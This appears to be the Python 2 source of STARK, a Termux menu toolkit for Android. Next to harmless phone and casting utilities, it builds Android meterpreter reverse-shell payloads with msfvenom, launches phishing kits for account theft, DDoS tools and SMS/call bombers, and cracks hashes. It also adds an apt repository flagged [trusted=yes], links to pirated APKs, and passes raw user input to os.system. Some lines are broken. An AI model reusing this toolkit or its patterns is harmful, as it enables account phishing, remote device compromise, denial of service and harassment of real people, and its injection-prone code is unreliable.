import os
import sys
import time
from termcolor import colored

##FUNCTIONS
PATH='./modules/test.txt'

def checkfile():
 if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
    print "Every thing is allright"
 else:
    print "some files are not installed"
    time.sleep(2)
    exit()


def netcheck():
 print(colored("""CHECKING INTERNET ON/OFF""", "green"))
 try :
    stri = "https://www.google.co.in"
    data = urllib.urlopen(stri)
    print "Connected"
 except:
    print(colored("""THIS TOOL REQUIRE INTERNET""", "red"))
    exit()

def reset():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

def printslow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)


def backtomenu():
        print(colored("""BACK TO MENU ?\n1. Yes\n2. No\n""","green"))
        backtomenu = raw_input("stark > ")
        if backtomenu == "1" or backtomenu == "y":
			reset()
        elif backtomenu == "2" or backtomenu == "n":
                sys.exit()
        else:
                print (colored("ERROR: WRONG COMMAND BRO.?",'red'))
                time.sleep(2)
                reset()


PATH1='./modules/apps'

def checkofflineapp():
 if os.path.isdir(PATH1) and os.access(PATH1, os.R_OK):
    print(colored(""""offline downloads are available""","green"))
 else:
	print(colored("""Looks like you didn't download some offline apps\n""","red", attrs=['bold']))
	print(colored("""Do you want to download some application as offline Y/N\n""","green"))
	checkoff = raw_input("ans > ")
	if checkoff == "y" or checkoff == "Y":
		os.system("wget https://www.dropbox.com/s/4sjxgndgziagsjt/apps.zip")
		os.system("unzip apps.zip")
		os.system("rm -rf apps.zip")
		os.system("mv apps modules/")
		reset()
	elif checkoff == "n" or checkoff == "N":
		print(colored("""ok""","green"))
 
###################Basic Command

def BasicC():
 print(colored("""
	=================================================
	 .########.....###.....######..####..######.
	 .##.....##...##.##...##....##..##..##....##
	 .##.....##..##...##..##........##..##......
	 .########..##.....##..######...##..##......
	 .##.....##.#########.......##..##..##......
	 .##.....##.##.....##.##....##..##..##....##
	 .########..##.....##..######..####..######.
	=================================================
	1. Flash Light
	2. Battery Status
	3. Capture Photo
	4. Text to Speech         (offline)
	5. Print Architecture
	6. Payload Maker
	7. PortForwarding         (using serveo.net)
	8. Connect Casting Devices
	=================================================
	9. Back
	=================================================
 """, "green"))

 basic = raw_input("stark > ")

 if basic == "1":
	flash()
 elif basic == "2":
	battery()
 elif basic == "3":
	cphoto()
 elif basic == "4":
	textspeach()
 elif basic == "5":
	os.system("dpkg --print-architecture")
        time.sleep(3)
 elif basic == "6":
	payload()
 elif basic == "7":
	portforward()
 elif basic == "8":
	cast()
 elif basic == "9":
	reset()

##################Casting Section
def cast():
 os.system("clear")
 print colored("""
  =================================
  =================================
  1. Scan Device
  2. Check Current Info/Cast
  3. Cast YouTube Video
  4. Cast File""","green"), colored("""Beta""","red"), colored("""
  ==================================
  H. Help""","green"), colored("""
  E. Exit""","red"), colored("""
  ==================================""","green")
 casto = raw_input("cast >")
 if casto == "1":
	 os.system("catt scan")
	 time.sleep(5)
	 cast()
 elif casto == "2":
	 os.system("catt info")
	 time.sleep(10)
	 cast()
 elif casto == "3":
	 castYT()
 elif casto == "4":
	 print colored("""Only these files are accepted-:""","red"), colored("""MP3, MP4, MKV, JPEG, JPG, PNG""","green")
	 print(colored("""enter file name with directory\nexample-:/sdcard/noob.jpg""","green"))
	 castF = raw_input("cast > ")
	 os.system("catt cast  " + castF +" ")
	 time.sleep(4)
	 cast()
 elif casto == "H" or casto == "h":
	 print colored("""
	 ===============================================""","white"), colored("""
	 This function will work on only casting devices
	 and casting devices are mostly connected to the
	 wifi. Before you start you need to connect to 
	 wifi and then use scan option to check casting
	 device is available or not.""","green"), colored("""
	 ===============================================""","white"), colored("""
	 1.Scan Device-: This Option will scan/search
	 casting device is available or not
	 
	 2.Check Current info/cast-: If there is casting
	 device is available so this option will 
	 scan/check current casting info/status
	 
	 
	 3.Cast YouTube Video-: if there is casting
	 device is available so this option give you
	 permission to cast any youtube video with just
	 pasting youtube video url
	 
	 4.Cast File-:""","green"), colored("""This Option is very unstable""","red"), colored("""
	 this option will allow you cast any file from your
	 phone but if your wifi range is too much low so
	 it take lots time/buffer to load your file""","green"), colored("""
	 ===============================================""","white"), colored("""
	 B. Back""","green"), colored("""
	 ===============================================""","white")
	 helpchoice = raw_input("say > ")
	 if helpchoice == "B" or helpchoice == "b":
		 cast()
	 else:
		 cast()	 
 elif casto == "E" or casto == "e":
	 os.system("clear")
	 BasicC()
 else:
	 cast()

def castYT():
 os.system("clear")
 print colored("""
  =============================""","white"), colored("""
  >>>>>>>>>>>Youtube<<<<<<<<<<<""","red", attrs=['bold']), colored("""
  =============================""","white"), colored("""
  1. Cast YouTube Video
  2. Add To Queue Video
  3. Cntrol""","green"), colored("""
  =============================""","white"), colored("""
  H. Help""","green"), colored("""
  E. Exit""","red"), colored("""
  =============================""","white")
 castyt = raw_input("YT > ")
 if castyt == "1":
  url = raw_input("Paste YT video url > ")
  os.system("catt cast " + url +" ")
  castYT()
 elif castyt == "2":
  addtoqueuevideo()
 elif castyt == "3":
  castcontrol()
 elif castyt == "H" or castyt == "h":
  print colored("""
   ===============================================""","white"), colored("""
   Before you start please check casting device is
   available or not using scan device option""","red"), colored("""
   ===============================================""","white"), colored("""
   1. Cast Youtube Video-: This Option will help
   you cast youtube video with just pasting youtube
   video url 
   
   2. Add To Queue Video-: This Option will help you
   to add more youtube video as queue. and don't ask
   me what is queue? just google it
   
   3. Control-: This option will help you to cotrol
   your casting device controlling like
   Volume, Pause, Stop(shutdown), play/resume and 
   TimeSeek""","green"), colored("""
   ==============================================""","white"), colored("""
   B. Back""","green"), colored("""
   ==============================================""","white")
  helpchoose = raw_input("say > ")
  if helpchoose == "B" or helpchoose == "b":
	   castYT()
  else:
	   castYT()
 elif castyt == "E" or castyt == "e":
  os.system("clear")
  cast()

def castcontrol():
 os.system("clear")
 print colored("""
  ====================================""","white"), colored("""
  ***************CONTROL**************""","cyan"), colored("""
  ====================================""","white"), colored("""
  R. Resume/Play
  P. Pause
  S. Stop/Off
  V. Volume     (1-100)
  T. Time seek""","green"), colored("""
  ====================================""","white"), colored("""
  H. Help""","green"), colored("""
  E. Exit""","red"), colored("""
  ====================================""","white")
 controlcast = raw_input("cmd > ")
 if controlcast == "R" or controlcast == "r":
	 os.system("catt play")
	 castcontrol()
 elif controlcast == "P" or controlcast == "p":
	 os.system("catt pause")
	 castcontrol()
 elif controlcast == "S" or controlcast == "s":
	 os.system("catt stop")
 elif controlcast == "V" or controlcast == "v":
	 volume = raw_input("volume > ")
	 os.system("catt volume "+ volume +" ")
	 castcontrol()
 elif controlcast == "T" or controlcast == "t":
	 timejump = raw_input("Jump > ")
	 os.system("catt seek "+ timejump +" ")
	 castcontrol()
 elif controlcast == "H" or controlcast == "h":
	 print colored("""
	 ==============================================""","white"), colored("""
	 R. Resume/Play This option will help you to
	 resume or play file in cast
	 
	 P. Pause This Option will help you to pause 
	 your casting file
	 
	 S. Stop/Off This Option will help you to stop or
	 in simple word this will stop casting a file 
	 to your casting device
	 
	 V. Volume (0/100) This Option will help you to
	 increase or decrease the volume""","green"), colored("""
	 (Be Remember that volume limit is 0 to 100)""","red"), colored("""
	 
	 T. Time Seek This Option will help you to 
	 jump on the middle of video example-:
	 Your casting video which and video length 
	 is 00:00 to 50:00 and you want forward the video
	 so i type 10:50 andjj fjfjfmmrjfgjf
			   M : S
	 ""","green")
	 backop = raw_input("say > ")
	 if backop == "E" or backop == "e":
		 castcontrol()
	 else:
		 castcontrol()

 elif controlcast == "E" or controlcast == "e":
	 os.system("clear")
	 castYT()
 
  
def addtoqueuevideo():
  queueurl = raw_input("Paste YT video url > ")
  os.system("catt add " + queueurl +" ")
  print(colored("""Do You Want To Add More Video's ?\n""","green"))
  queuevideo = raw_input("Tell Me > ")
  if queuevideo == "y" or queuevideo == "Y":
	  addtoqueuevideo()
  elif queuevideo == "n" or queuevideo == "N":
	  castYT()

###############cast section end

def portforward():
 print(colored("""
  #######################
  1. HTTP
  2. TCP
  ######################
  """, "green"))
 port = raw_input("portf > ")
 if port == "1":
  p1 = raw_input("HTTPS > ")
  os.system("ssh -R 80:localhost:"+ p1 +" serveo.net")
 if port == "2":
  p2 = raw_input("TCP > ")
  os.system("ssh -R "+ p2 +":localhost:"+ p2 +" serveo.net")

def payload():
 print(colored("""
  #######################
  1. Android
  #######################
  """, "green"))
 pay = raw_input("pay > ")
 if pay == "1":
  print(colored("""Enter LocalHost And LPort""", "green"))
  l1 = raw_input("host > ")
  l2 = raw_input("port > ")
  os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ l1 +" LPORT="+ l2 +" R > /sdcard/payload.apk")
  print(colored("""payload save in sdcard payload.apk""", "green"))
  time.sleep(5)
  BasicC()
  
def flash():
 print(colored("""
	===============
	1. On
	2. Off
	===============
	H. Help
	B. Back
	===============
 ""","green"))
 torch = raw_input("stark >")
 if torch == "1":
  os.system("termux-torch on")
  os.system("clear")
  flash()
 elif torch == "2":
  os.system("termux-torch off")
  os.system("clear")
  flash()
 elif torch == "h" or torch == "H":
	 printslow(colored("""Reason's of flash light not turning on\n1. Termux-Api package and app is not installed\n2. Your running screen recorder or camera in background\n""","green"))
	 time.sleep(5)
	 os.system("clear")
	 flash()
 elif torch == "b" or torch == "B":
	 os.system("clear")
	 BasicC()

def battery():
 os.system("termux-battery-status")
 backtomenu()


def cphoto():
 print(colored("""
  #####################
  1.Back
  2.Front
  ####################
  B. Back
  ####################
  """, "green"))
 cp = raw_input("photo > ")
 if cp == "1":
  os.system("termux-camera-photo -c 0 /sdcard/back.jpg")
  print(colored("""image has been saved in /sdcard/back.jpg""", "green"))
  time.sleep(3)
  os.system("clear")
  cphoto()
	 
 elif cp == "2":
  os.system("termux-camera-photo -c 1 /sdcard/front.jpg")
  print(colored("""image has been saved in /sdcard/front.jpg""", "green"))
  time.sleep(3)
  os.system("clear")
  cphoto()
 elif cp == "B" or cp == "b":
	 BasicC()
	 
def textspeach():
 print(colored("""Enter here your words sir""", "green"))
 txtsp = raw_input("text > ")
 os.system("termux-tts-speak "+ txtsp +".")

###################About Section
def follow():
 print(colored("""
  #######################
  1. Follow Blogger
  2. Follow Unknown_girl404 
  3. Follow Instagram
  4. Follow YouTube Channel
  5. GitHub
  ########################
  """, "green"))
 visit = raw_input("go > ")
 if visit == "1":
  os.system("termux-open-url https://gamerstech330.blogspot.com/")
 elif visit == "2":
  os.system("termux-open-url https://instagram.com/unknown_girl404")
 elif visit == "3":
  os.system("termux-open-url https://instagram.com/aniketstark330")
 elif visit == "4":
  os.system("termux-open-url https://www.youtube.com/channel/UCjb4zsUpNuSSaCCUirQL_sQ")
 elif visit == "5":
  os.system("termux-open-url https://github.com/aniketstark")

###################Credit Section
def Credits():
 print colored("""
  ##############################################
  TOOLS                 DEVELOPERS
  ##############################################
  ShellPhish            TheLinuxChoice
  BlackEye              TheLinuxChoice
  Weeman                Evait Security GmbH
  Red_Hawk              Tuhinshubhra
  Hasher                CiKu370
  SCANNER-INURLBR       GoogleINURL
  TorsHammer            TheLinuxChoice
  Hulk                  Grafov
  GoldenEye             Jseidl
  Breacher(admin_f)     s0md3v
  STARK2.0              AniketStark,Unknown_Girl
  Phishy                Anikestark,Sagar Tripathy
  ##############################################
  """, "green")
 os.system("echo This will Closed 20sec | lolcat -a -d 200")

###################Account Hacking Section

def AccountH():
 print colored("""
  ===============================================================
    ....###.....######......##.....##....###.....######..##....##
    ...##.##...##....##.....##.....##...##.##...##....##.##...##.
    ..##...##..##...........##.....##..##...##..##.......##..##..
    .##.....##.##...........#########.##.....##.##.......#####...
    .#########.##...........##.....##.#########.##.......##..##..
    .##.....##.##....##.###.##.....##.##.....##.##....##.##...##.
    .##.....##..######..###.##.....##.##.....##..######..##....##
  ===============================================================""", "red"), colored("""
   1. ShellPhish
   2. Weeman
   3. BlackEye
   4. F@cebookhack
   5. Phishy""","green"), colored("""
  ===============================================================
  """, "red")
 phish = raw_input("phishing > ")
 if phish == "1":
  os.system("cd modules/shellphish && bash shellphish.sh")
 elif phish  == "2":
  os.system("cd modules/weeman && python2 weeman.py")
 elif phish  == "3":
  os.system("cd modules/blackeye/ && bash blackeye.sh")
 elif phish  == "4":
  os.system("cd modules/facebookhack/ && python2 facebook.py")
 elif phish  == "5":
  os.system("cd modules/Phishy/ && python2 phishy.py")
 elif phish  == "6":
  reset()

###################Web Hacking Section

def WebH():
 print colored("""
    ____  ____  ____  ____  ____  ____  ____ 
   ||W ||||e ||||b ||||H ||||a ||||c ||||k ||
   ||__||||__||||__||||__||||__||||__||||__||
   |/__\||/__\||/__\||/__\||/__\||/__\||/__\|
   ==========================================""", "white"), colored("""
   1. Red_Hawk
   2. SQLDork
   3. WebAdminFinder
   4. SQLMap
   5. Hulk	      (DDOS TOOL)
   6. Torshammer      (DDOS TOOL)
   7. GoldenEye       (DDOS TOOL)""","green"), colored("""
   ==========================================
   """, "white")
 web = raw_input("webh > ")
 if web == "1":
  os.system("cd modules/RED_HAWK && php rhawk.php")
 elif web == "2":
  sqldork()
  os.system("echo Terminal Clean in 9min | lolcat -a -d 9000")
 elif web == "3":
  webadm()
  time.sleep(6)
 elif web == "4":
  sqlmap()
 elif web == "5":
  hulk()
 elif web == "6":
  torsh()
 elif web == "7":
  gold()

def hulk():
  print(colored("""Enter Website Link""", "green"))
  print(colored("""Hulk is unstable""", "red"))
  dos3 = raw_input("url > ")
  os.system("cd modules/hulk && python2 hulk.py "+ dos3 +" safe")

def torsh():
  print(colored("""Enter Website Link""", "green"))
  dos1 = raw_input("url > ")
  os.system("cd modules/torshammer/ && python2 torshammer.py -t "+ dos1 +" -r 256")

def gold():
  print(colored("""Enter Website Link""", "green"))
  dos2 = raw_input("url > ")
  os.system("cd modules/GoldenEye/ && python2 goldeneye.py "+ dos2 +" -w 10 -s 500")

def sqlmap():
  printslow(colored("""CLONING SQLMAP IN HOME""","green"))
  os.system("git clone https://github.com/sqlmapproject/sqlmap")
  os.system("mv sqlmap ~")
  printslow(colored("""Warning""","red"))
  printslow(colored("""YOU NEED TO USE SQLMAP AS MANUALY""","green"))

def webadm():
  print(colored("""Enter Website Url""", "green"))
  web1 = raw_input("url > ")
  os.system("cd modules/Breacher && python2 breacher.py -u "+ web1 +" --fast")

def sqldork():
  os.system("cd modules/SCANNER-INURLBR/ && bash sql.sh")
  backtomenu()

###################Hash Crack Section
def HASH():
 print colored("""
   __    __       ___           _______. __    __  
  |  |  |  |     /   \         /       ||  |  |  | 
  |  |__|  |    /  ^  \       |   (----`|  |__|  | 
  |   __   |   /  /_\  \       \   \    |   __   | 
  |  |  |  |  /  _____  \  .----)   |   |  |  |  | 
  |__|  |__| /__/     \__\ |_______/    |__|  |__| 
                                                   
 ========================================================== ""","blue"), colored("""
 1. Hash-Buster
 2. Hasher
 3. MD5Buteforce""","green"), colored("""
 ==========================================================""","blue")
 hasher = raw_input("hash > ")
 if hasher == "1":
  print colored("""Enter Hash""","green")
  hash = raw_input("hash > ")
  os.system("cd modules/Hash-Buster/ && python hash.py -s""+ hash +")
  time.sleep(5)
 elif hasher == "2":
  os.system("cd modules/hasher && python2 hash.py")
 elif hasher == "3":
  os.system("cd modules/md5brute && python2 md5brute.py")
  time.sleep(5)

###################Termux Section
def Termux():
 print colored("""
   ______  ____ ____  ___  ___ __ __ _   _
  | || | ||    || \\ ||\\//|| || || \\ //
    ||   ||==  ||_// || \/ || || ||  )X( 
    ||   ||___ || \\ ||    || \\_// // \\
                                         
  ==========================================""","cyan"), colored("""
  1. Lazymux
  2. Beef Framework  ( to many error with unstable metasploit )
  3. ohmyzsh	     (new look for termux)
  4. TBomb           (SMS AND CALL SPAM)
  5. TBomb Mod       (SMS AND CALL SPAM UNLIMITED)
  6. LazyMeta	     (Payload Maker Tool)
  7. Install Nethunter Termux
  8. Install/Update Termux Packages""","green"), colored("""
  ==========================================""","cyan"), colored("""
  9. Back""","green"), colored("""
  ==========================================""","cyan")
 term = raw_input("term > ")
 if term == "1":
  os.system("git clone https://github.com/Gameye98/Lazymux")
  os.system("mv Lazymux ~")
 elif term == "2":
  os.system("""mkdir -p $PREFIX/etc/apt/sources.list.d && printf "deb [trusted=yes] https://hax4us.github.io/termux-tools/ extras main" > $PREFIX/etc/apt/sources.list.d/hax4us.list""")
  os.system("apt update")
  printslow(colored("Now open new tab use this command\napt install update then pkg install beef-xss", 'green'))
 elif term == "3":
  os.system("git clone https://github.com/aniketstark/ohmyzsh")
  os.system("mv ohmyzsh ~")
 elif term == "4":
  os.system("git clone https://github.com/TheSpeedX/TBomb")
  os.system("mv TBomb ~")
 elif term == "5":
  os.system("git clone https://github.com/H420Prajyot/bomber")
  os.system("mv bomber ~")
  printslow(colored("""TBomb mod version is installed in main Dir.\n For installation and more info i am redirecting you""","green"))
  os.system("termux-open https://github.com/H420Prajyot/bomber/blob/master/README.md")
 elif term == "6":
  os.system("git clone https://github.com/aniketstark/LazyMeta")
  os.system("mv LazyMeta ~")
 elif term == "7":
  os.system("cd && wget -O install-nethunter-termux https://offs.ec/2MceZWr && chmod +x install-nethunter-termux")
  printslow(colored("Now Run Following Command\n cd && ./install-nethunter-termux",'green'))
 elif term == "8":
  os.system("apt install -y python python2 wget curl php python3 clang git curl zip pv tar termux-api")
 elif term == "9":
  exit()
  
 elif term == "0":
  reset()
###################Error Fixer Section

def EFixer():
 os.system("clear")
 print colored("""
  .########.########..########...#######..########.
  .##.......##.....##.##.....##.##.....##.##.....##
  .##.......##.....##.##.....##.##.....##.##.....##
  .######...########..########..##.....##.########.
  .##.......##...##...##...##...##.....##.##...##..
  .##.......##....##..##....##..##.....##.##....##.
  .########.##.....##.##.....##..#######..##.....##

  .##..........#####...##.......
  .##....##...##...##..##....##.
  .##....##..##.....##.##....##.
  .##....##..##.....##.##....##.
  .#########.##.....##.#########
  .......##...##...##........##.
  .......##....#####.........##.
  ==================================================""","red"), colored("""
  1. Metasploit database fixer
  2. Metasploit nokogiri fixer
  3. beef nokogiri fixer
  4. Setup storage in Termux
  5. Restore official source list
  6. Beef bundle not install Fix (thread,nokogiri,gem file fix)
  7. Restore Termux Buttons (arrows,pgdn..more)
  8. Fix Nethunter GUI/Kex Error  (Fix No GUI)
  9. Fix Nethunter GUI Black Screen"
  10.Fix Termux VNC X1-lock""","green"), colored("""
  ==================================================""","red")
 Fix = raw_input("stark > ")
 if Fix == "1":
     os.system("mkdir -p $PREFIX/var/lib/postgresql")
     os.system("initdb $PREFIX/var/lib/postgresql")
     os.system("pg_ctl -D $PREFIX/var/lib/postgresql start")
     print(colored("""FIXED.!""", "green"))
     printslow(colored("""if you get this error again by again\n so fix from here ok. :)""","red"))

 elif Fix == "2":
     os.system("bundle config build.nokogiri --use-system-libraries")
     os.system("bundle install")

 elif Fix == "4":
        print_slow(colored("""Fixing storage\n""", "green"))
        os.system("termux-setup-storage")
        printslow(colored("""Fixed..!""", "green"))

 elif Fix == "3":
     os.system("cd $PREFIX/share/beef-xss && gem install nokogiri")
     printslow(colored("FIXED !", 'green'))

 elif Fix == "5":
     os.system("wget https://www.dropbox.com/s/tntdeo1q9bpwc6c/sources.list")
     os.system("rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list")
     os.system("rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d")
     os.system("mv sources.list /data/data/com.termux/files/usr/etc/apt/")

 elif Fix == "6":
        os.system("cd $PREFIX/share/beef-xss && bundle install")

 elif Fix == "7":
	os.system("cp modules/termux.properties ~/.termux/")
	printslow(colored("""fix now restart your termux""", "green"))
 elif Fix == "8":
	printslow(colored("INSTALL VNC VIEWER FROM PLAYSTORE\n",'green'))
	os.system("termux-open https://play.google.com/store/apps/details?id=com.realvnc.viewer.android")
	time.sleep(4)
	printslow(colored("Keep Calm And Just Belive Me\n\n 1. Start Nethuter\n\n2. Copy Paste This Command\napt-get update\napt-get install lxde-core lxde kali-defaults kali-root-login desktop-base\napt install tightvncserver\n\nvncserver\n\n4. Now Set Password\n\n5. After set password run this command\n DISPLAY=:1 startlxde &\n\n\n Now Main Thing\nHow to Start VNC\nvncserver :1\n\nHow To Stop VNCserver\nvncserver -kill :1\n.",'green'))
	os.system("echo ENJOY KALI LINUX  GUI | lolcat -a -d 1000")
 elif Fix == "9":
	 printslow(colored("""So you install nethunter h.\nthen your excitement was increases and you trying to\nAccess GUI of Nethunter and you get fucking black screen\nThis is because of you don't follow the steps of nethunter installation\n\n WHEN EVER YOU INSTALL OS. FIRST OF ALL YOU NEED TO UPDATE\napt install update\n apt install dist-upgrade""","green"))
 elif Fix == "10":
	 os.system("cd /data/data/com.termux/files/usr/tmp/ && rm -rf .X1-lock .X11-unix")
	 os.system("echo Fixed Now Restart Your Vncserver | lolcat -a -d 60")
 elif Fix == "11":
     os.system("clear")
     reset()


#########MOVIE Section
def movie():
 print colored("""
  ===============================""","red"), colored("""
  1. Mr.Robot       (Recommended)
  2. Who Am I
  3. Hackerman
  4. Snowden""","green"), colored("""
  ===============================""","red")
 moviem = raw_input("stark > ")
 if moviem == "1":
   os.system("termux-open https://g.co/kgs/JttJnS")
 elif moviem == "2":
   os.system("termux-open https://g.co/kgs/L8vm4s")
 elif moviem == "3":
   os.system("termux-open https://g.co/kgs/bQepZc")
 elif moviem == "4":
   os.system("termux-open https://g.co/kgs/cG8iTQ")

##############Important application for android
def impapp():
 os.system("clear")
 print colored("""
 ========================================""","white"), colored("""
         Importan Apps For Android       ""","magenta", attrs=['bold']), colored("""
 ========================================""","white"), colored("""
 1. Photoshop LightRoom           Mod
 2. Background Remover
 3. Kinemaster                    Mod
 4. Image Compressor size reducer
 5. Media Convertor
 6. Screen Rotation Controller
 7. IDM Downloader
 8. NewPipe (YT Downloader)
 9. World Radio""","green", attrs=['bold']), colored("""
 ========================================""","white"), colored("""
 E. Exit""","red", attrs=['bold']), colored("""
 ========================================""","white")
 impapk = raw_input("App > ")
 if impapk == "1":
	 print colored("""
	 ========================
	 1. Server 1
	 2. Server 2
	 3. offline server
	 ========================""","green")
	 s = raw_input("server > ")
	 if s == "1":
		 os.system("termux-open https://moddroid.com/adobe-photoshop-lightroom-cc-1.html")
		 impapp()
	 if s == "2":
		 os.system("termux-open https://www.google.com/amp/s/apkdone.com/adobe-lightroom/amp/")
		 impapp()
	 if s == "3":
		 os.system("termux-open modules/apps/ps_lightroom.apk")
		 impapp()
		 
 elif impapk == "2":
	 print colored("""
	 ========================
	 1. Server 1
	 3. offline server
	 ========================""","green")
	 s = raw_input("server > ")
	 if s == "1":
		 os.system("termux-open https://play.google.com/store/apps/details?id=com.handycloset.android.eraser")
		 impapp()
	 elif s == "2":
		 os.system("termux-open modules/apps/bg_remover.apk")
		 impapp()
		 
 elif impapk == "3":
	 print colored("""
	 ========================
	 1. Server 1
	 2. Server 2
	 3. offline server
	 ========================""","green")
	 s = raw_input("server > ")
	 if s == "1":
		 os.system("termux-open https://rexdl.com/android/kinemaster-pro-video-editor-apk.html/")
		 impapp()
	 elif s == "2":
		 os.system("termux-open https://moddroid.com/kinemaster-pro-51908.html")
		 impapp()
	 elif s == "3":
		 os.system("termux-open modules/apps/kimemaster.apk")
		 impapp()
		 
 elif impapk == "4":
	 print colored("""
	 ========================
	 1. Server 1
	 2. offline server
	 ========================""","green")
	 s = raw_input("server > ")
	 if s == "1":
		 os.system("termux-open https://play.google.com/store/apps/details?id=com.mobso.photoreducer.lite")
		 impapp()
	 elif s == "2":
		 os.system("termux-open modules/apps/imgcompressor.apk")
		 impapp()

 elif impapk == "5":
	 print colored("""
	 ========================
	 1. Server 1
	 2. offline server
	 ========================""","green")
	 s = raw_input("server > ")
	 if s == "1":
		 os.system("termux-open https://play.google.com/store/apps/details?id=com.AndroidA.MediaConverter")
		 impapp()
	 elif s == "2":
		 os.system("termux-open modules/apps/mc.apk")
		 impapp()
		 
 elif impapk == "6":
	 print colored("""
	 ========================
	 1. Server 1
	 2. offline server
	 ========================""","green")
	 s = raw_input("server > ")
	 if s == "1":
		 os.system("termux-open https://play.google.com/store/apps/details?id=ahapps.controlthescreenorientation")
		 impapp()
	 elif s == "2":
		 os.system("termux-open modules/apps/screenrotation.apk")
		 impapp()
		 
 elif impapk == "7":
	 print colored("""
	 ========================
	 1. Server 1
	 2. offline server
	 ========================""","green")
	 s = raw_input("server > ")
	 if s == "1":
		 os.system("termux-open https://play.google.com/store/apps/details?id=idm.internet.download.manager")
		 impapp()
	 elif s == "2":
		 os.system("termux-open modules/apps/idm.apk")
		 impapp()
		 
 elif impapk == "8":
	 print colored("""
	 ========================
	 1. Server 1
	 2. Server 2
	 ========================""","green")
	 s = raw_input("server > ")
	 if s == "1":
		 os.system("termux-open https://newpipe.schabi.org/")
		 impapp()
	 elif s == "2":
		 os.system("termux-open https://github.com/TeamNewPipe/NewPipe")
		 impapp()
 elif impapk == "9":
	 print colored("""
	 ========================
	 1. Server 1
	 2. Website Interface
	 ========================""","green")
	 s = raw_input("server > ")
	 if s == "1":
		 os.system("termux-open https://play.google.com/store/apps/details?id=com.jonathanpuckey.radiogarden")
		 impapp()
	 elif s == "2":
		 os.system("termux-open http://radio.garden/")
		 impapp()
